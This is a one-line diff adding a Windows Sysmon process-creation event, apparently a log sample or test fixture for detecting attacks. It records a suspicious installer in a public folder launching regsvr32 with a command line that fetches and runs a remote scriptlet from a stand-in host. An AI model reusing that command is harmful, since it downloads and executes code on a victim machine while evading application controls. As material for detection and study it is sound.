@@ -1,0 +1,1 @@
+{"Event": {"System": {"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WKS07"}, "EventData": {"Image": "C:\\Windows\\System32\\regsvr32.exe", "CommandLine": "regsvr32.exe /s /n /u /i:http://10.10.14.7:8080/a.sct scrobj.dll", "ParentImage": "C:\\Users\\Public\\vendor-installer.exe", "User": "CORP\\victim"}}}
